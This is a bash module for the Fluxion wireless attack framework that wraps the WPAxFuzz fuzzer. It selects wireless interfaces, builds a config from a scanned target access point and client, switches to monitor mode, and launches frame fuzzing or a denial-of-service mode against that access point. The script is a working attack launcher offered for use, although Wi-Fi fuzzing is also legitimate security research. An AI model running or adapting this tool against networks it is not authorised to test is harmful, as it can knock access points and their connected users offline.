#!/usr/bin/env bash

# ============================================================ #
# ================ < WPAxFuzz Attack Module > ================ #
# ============================================================ #
# Integration of WPAxFuzz Wi-Fi fuzzer with Fluxion
# Leverages Fluxion's interface selection and target scanning

WPAxFuzzState="Not Ready"

# Path to WPAxFuzz
readonly WPAxFuzzPath="$FLUXIONPath/WPAxFuzz"
readonly WPAxFuzzConfigPath="$WPAxFuzzPath/src/config.json"

# ============================================================ #
# ================ < WPAxFuzz Subroutines > ================== #
# ============================================================ #

wpaxfuzz_check_dependencies() {
  # Check if WPAxFuzz directory exists
  if [ ! -d "$WPAxFuzzPath" ]; then
    echo -e "${CRed}WPAxFuzz not found at $WPAxFuzzPath${CClr}"
    echo -e "${CYel}Please clone WPAxFuzz into the fluxion directory:${CClr}"
    echo "  cd $FLUXIONPath && git clone https://github.com/efchatz/WPAxFuzz.git"
    return 1
  fi

  # Check for Python3
  if ! command -v python3 &> /dev/null; then
    echo -e "${CRed}Python3 is required but not installed${CClr}"
    return 1
  fi

  # Check for scapy
  if ! python3 -c "import scapy" &> /dev/null; then
    echo -e "${CYel}Installing scapy...${CClr}"
    pip3 install scapy
  fi

  # Check for blab binary
  if [ ! -f "$WPAxFuzzPath/blab" ]; then
    echo -e "${CYel}Blab binary not found. Building...${CClr}"
    wpaxfuzz_build_blab
  fi

  return 0
}

wpaxfuzz_build_blab() {
  local tmpdir=$(mktemp -d)
  cd "$tmpdir"

  if git clone https://haltp.org/git/blab.git; then
    cd blab
    if make; then
      cp bin/blab "$WPAxFuzzPath/"
      echo -e "${CGrn}Blab built successfully${CClr}"
    else
      echo -e "${CRed}Failed to build blab${CClr}"
      return 1
    fi
  else
    echo -e "${CRed}Failed to clone blab repository${CClr}"
    return 1
  fi

  rm -rf "$tmpdir"
  return 0
}

wpaxfuzz_unset_attack_interface() {
  WPAxFuzzAttackInterfaceOriginal=""
  if [ ! "$WPAxFuzzAttackInterface" ]; then return 1; fi
  WPAxFuzzAttackInterface=""
}

wpaxfuzz_set_attack_interface() {
  if [ "$WPAxFuzzAttackInterface" ]; then return 0; fi

  if [ ! "$WPAxFuzzAttackInterfaceOriginal" ]; then
    echo "Selecting attack interface for WPAxFuzz..." > $FLUXIONOutputDevice
    if ! fluxion_get_interface attack_targetting_interfaces \
      "$WPAxFuzzAttackInterfaceQuery"; then
      echo "Failed to get attack interface" > $FLUXIONOutputDevice
      return 1
    fi
    WPAxFuzzAttackInterfaceOriginal=$FluxionInterfaceSelected
  fi

  local selectedInterface=$WPAxFuzzAttackInterfaceOriginal

  if ! fluxion_allocate_interface $selectedInterface; then
    echo "Failed to allocate attack interface" > $FLUXIONOutputDevice
    return 2
  fi

  WPAxFuzzAttackInterface=${FluxionInterfaces[$selectedInterface]}
  echo "Attack interface set to: $WPAxFuzzAttackInterface" > $FLUXIONOutputDevice
}

wpaxfuzz_unset_monitor_interface() {
  WPAxFuzzMonitorInterfaceOriginal=""
  if [ ! "$WPAxFuzzMonitorInterface" ]; then return 1; fi
  WPAxFuzzMonitorInterface=""
}

wpaxfuzz_set_monitor_interface() {
  if [ "$WPAxFuzzMonitorInterface" ]; then return 0; fi

  # Check available interfaces
  local interfacesAvailable
  readarray -t interfacesAvailable < <(attack_targetting_interfaces)

  # If only one interface, use it for both (some operations work with single)
  if [ ${#interfacesAvailable[@]} -le 1 ]; then
    WPAxFuzzMonitorInterface=$WPAxFuzzAttackInterface
    echo "Using same interface for attack and monitor" > $FLUXIONOutputDevice
    return 0
  fi

  if [ ! "$WPAxFuzzMonitorInterfaceOriginal" ]; then
    echo "Selecting monitor interface for WPAxFuzz..." > $FLUXIONOutputDevice
    if ! fluxion_get_interface attack_targetting_interfaces \
      "$WPAxFuzzMonitorInterfaceQuery"; then
      echo "Failed to get monitor interface" > $FLUXIONOutputDevice
      return 1
    fi
    WPAxFuzzMonitorInterfaceOriginal=$FluxionInterfaceSelected
  fi

  local selectedInterface=$WPAxFuzzMonitorInterfaceOriginal

  if ! fluxion_allocate_interface $selectedInterface; then
    echo "Failed to allocate monitor interface" > $FLUXIONOutputDevice
    return 2
  fi

  WPAxFuzzMonitorInterface=${FluxionInterfaces[$selectedInterface]}
  echo "Monitor interface set to: $WPAxFuzzMonitorInterface" > $FLUXIONOutputDevice
}

wpaxfuzz_generate_config() {
  # Generate WPAxFuzz config from Fluxion target data
  local targetMAC="${FluxionTargetMAC:-}"
  local targetSSID="${FluxionTargetSSID:-}"
  local targetChannel="${FluxionTargetChannel:-1}"
  local attackInterface="${WPAxFuzzAttackInterface:-wlan0}"
  local monitorInterface="${WPAxFuzzMonitorInterface:-wlan1}"

  # Get a connected client MAC if available
  local targetSTA=""
  if [ -f "$FLUXIONWorkspacePath/clients.txt" ]; then
    targetSTA=$(head -1 "$FLUXIONWorkspacePath/clients.txt" 2>/dev/null | cut -d',' -f1)
  fi

  # If no client found, use broadcast
  if [ -z "$targetSTA" ]; then
    targetSTA="FF:FF:FF:FF:FF:FF"
  fi

  cat > "$WPAxFuzzConfigPath" << EOF
{
   "AP_info":{
      "AP_MAC_ADDRESS":"$targetMAC",
      "AP_SSID":"$targetSSID",
      "AP_CHANNEL":$targetChannel,
      "AP_MAC_DIFFERENT_FREQUENCY":"",
      "CHANNEL_DIFFERENT_FREQUENCY":36,
      "PASSWORD":""
   },
   "STA_info":{
      "TARGETED_STA_MAC_ADDRESS":"$targetSTA"
   },
   "ATT_interface_info":{
      "ATTACKING_INTERFACE":"$attackInterface",
      "MONITORING_INTERFACE":"$monitorInterface"
   }
}
EOF

  echo -e "${CGrn}Generated WPAxFuzz config:${CClr}"
  echo "  Target AP: $targetSSID ($targetMAC)"
  echo "  Channel: $targetChannel"
  echo "  Target STA: $targetSTA"
  echo "  Attack Interface: $attackInterface"
  echo "  Monitor Interface: $monitorInterface"
}

wpaxfuzz_select_fuzz_mode() {
  local choices=(
    "Fuzz Management Frames"
    "Fuzz SAE Exchange (WPA3)"
    "Fuzz Control Frames"
    "Fuzz Data Frames (BETA)"
    "DoS Attack Module"
    "$FLUXIONGeneralBackOption"
  )

  io_query_choice "Select WPAxFuzz Operation" choices[@]
  WPAxFuzzMode=$IOQueryChoice

  case "$IOQueryChoice" in
    "${choices[0]}") WPAxFuzzModeArg="1";;
    "${choices[1]}") WPAxFuzzModeArg="2";;
    "${choices[2]}") WPAxFuzzModeArg="3";;
    "${choices[3]}") WPAxFuzzModeArg="4";;
    "${choices[4]}") WPAxFuzzModeArg="5";;
    "${choices[5]}") return 1;;
  esac

  return 0
}

wpaxfuzz_select_frame_type() {
  # For management frames, select specific frame type
  if [ "$WPAxFuzzModeArg" = "1" ]; then
    local frameChoices=(
      "Beacon Frames"
      "Probe Request Frames"
      "Probe Response Frames"
      "Association Request Frames"
      "Association Response Frames"
      "Reassociation Request Frames"
      "Reassociation Response Frames"
      "Authentication Frames"
      "$FLUXIONGeneralBackOption"
    )

    io_query_choice "Select Frame Type to Fuzz" frameChoices[@]

    case "$IOQueryChoice" in
      "${frameChoices[8]}") return 1;;
      *) WPAxFuzzFrameType=$IOQueryChoice;;
    esac
  fi

  return 0
}

wpaxfuzz_select_mode_type() {
  # Select standard or random mode
  local modeChoices=(
    "Standard Mode (valid frame sizes)"
    "Random Mode (random frame sizes)"
    "$FLUXIONGeneralBackOption"
  )

  io_query_choice "Select Fuzzing Mode" modeChoices[@]

  case "$IOQueryChoice" in
    "${modeChoices[0]}") WPAxFuzzStdRandom="standard";;
    "${modeChoices[1]}") WPAxFuzzStdRandom="random";;
    "${modeChoices[2]}") return 1;;
  esac

  return 0
}

wpaxfuzz_run() {
  echo -e "${CGrn}Starting WPAxFuzz...${CClr}"
  echo ""

  # Put interface in monitor mode
  echo -e "${CYel}Setting $WPAxFuzzAttackInterface to monitor mode...${CClr}"
  airmon-ng start "$WPAxFuzzAttackInterface" > /dev/null 2>&1

  # Determine the monitor interface name (usually interface + "mon")
  local monInterface="${WPAxFuzzAttackInterface}mon"
  if ! iwconfig "$monInterface" &>/dev/null; then
    monInterface="$WPAxFuzzAttackInterface"
  fi

  # Set channel
  echo -e "${CYel}Setting channel to $FluxionTargetChannel...${CClr}"
  iwconfig "$monInterface" channel "$FluxionTargetChannel" 2>/dev/null

  # Build bridge command with all arguments
  local bridgeCmd="python3 '$WPAxFuzzPath/fluxion_bridge.py'"
  bridgeCmd+=" --ap-mac '$FluxionTargetMAC'"
  bridgeCmd+=" --ap-ssid '$FluxionTargetSSID'"
  bridgeCmd+=" --channel '$FluxionTargetChannel'"
  bridgeCmd+=" --attack-iface '$monInterface'"
  bridgeCmd+=" --monitor-iface '$WPAxFuzzMonitorInterface'"

  # Add target STA if available
  if [ -f "$FLUXIONWorkspacePath/clients.txt" ]; then
    local targetSTA=$(head -1 "$FLUXIONWorkspacePath/clients.txt" 2>/dev/null | cut -d',' -f1)
    if [ -n "$targetSTA" ]; then
      bridgeCmd+=" --sta-mac '$targetSTA'"
    fi
  fi

  # Add mode arguments
  bridgeCmd+=" --mode $WPAxFuzzModeArg"

  if [ -n "$WPAxFuzzStdRandom" ]; then
    bridgeCmd+=" --std-random $WPAxFuzzStdRandom"
  fi

  # Run WPAxFuzz in xterm via the bridge
  xterm $FLUXIONHoldXterm -title "WPAxFuzz - WiFi Fuzzer" \
    -e "cd '$WPAxFuzzPath' && $bridgeCmd" &
  WPAxFuzzPID=$!

  echo ""
  echo -e "${CGrn}WPAxFuzz is running in a separate window${CClr}"
  echo -e "${CYel}Target: $FluxionTargetSSID ($FluxionTargetMAC) on channel $FluxionTargetChannel${CClr}"
  echo -e "${CYel}Interface: $monInterface${CClr}"
  echo ""
  echo -e "${CYel}Press any key to stop and return to menu...${CClr}"
  read -n 1 -s

  # Cleanup
  if [ -n "$WPAxFuzzPID" ]; then
    kill $WPAxFuzzPID 2>/dev/null
  fi

  # Restore interface
  airmon-ng stop "$monInterface" > /dev/null 2>&1
}# ============================================================ #
# =================== < Attack Routines > ==================== #
# ============================================================ #

# Tracker file for attack state
readonly WPAxFuzzStateFile="$FLUXIONWorkspacePath/wpaxfuzz_state"

attack_targetting_interfaces() {
  interface_list_wireless
  local interface
  for interface in "${InterfaceListWireless[@]}"; do
    echo "$interface"
  done
}

unprep_attack() {
  WPAxFuzzState="Not Ready"

  wpaxfuzz_unset_attack_interface
  wpaxfuzz_unset_monitor_interface

  sandbox_remove_workfile "$WPAxFuzzStateFile"
}

prep_attack() {
  # Check dependencies
  if ! wpaxfuzz_check_dependencies; then
    echo -e "${CRed}WPAxFuzz dependencies not met${CClr}"
    return 1
  fi

  # Set attack interface
  while [ ! "$WPAxFuzzAttackInterface" ]; do
    if ! wpaxfuzz_set_attack_interface; then
      return 1
    fi
  done

  # Set monitor interface (optional - can use same as attack)
  while [ ! "$WPAxFuzzMonitorInterface" ]; do
    if ! wpaxfuzz_set_monitor_interface; then
      # If failed but attack interface exists, use that
      if [ "$WPAxFuzzAttackInterface" ]; then
        WPAxFuzzMonitorInterface=$WPAxFuzzAttackInterface
        break
      fi
      return 1
    fi
  done

  WPAxFuzzState="Ready"
}

start_attack() {
  # Generate config from Fluxion target
  wpaxfuzz_generate_config

  echo ""

  # Select fuzzing mode
  if ! wpaxfuzz_select_fuzz_mode; then
    return 1
  fi

  # Select mode type (standard/random) for applicable modes
  if [ "$WPAxFuzzModeArg" = "1" ] || [ "$WPAxFuzzModeArg" = "3" ] || [ "$WPAxFuzzModeArg" = "4" ]; then
    if ! wpaxfuzz_select_mode_type; then
      return 1
    fi
  fi

  # Run the fuzzer
  wpaxfuzz_run
}

stop_attack() {
  if [ -n "$WPAxFuzzPID" ]; then
    kill $WPAxFuzzPID 2>/dev/null
    WPAxFuzzPID=""
  fi

  # Restore interface from monitor mode
  airmon-ng stop "${WPAxFuzzAttackInterface}mon" > /dev/null 2>&1

  echo -e "${CGrn}WPAxFuzz attack stopped${CClr}"
}

# ============================================================ #
# ================= < Language Strings > ===================== #
# ============================================================ #
WPAxFuzzAttackInterfaceQuery="Select attack interface for fuzzing"
WPAxFuzzMonitorInterfaceQuery="Select monitor interface (or same as attack)"

# End of attack module
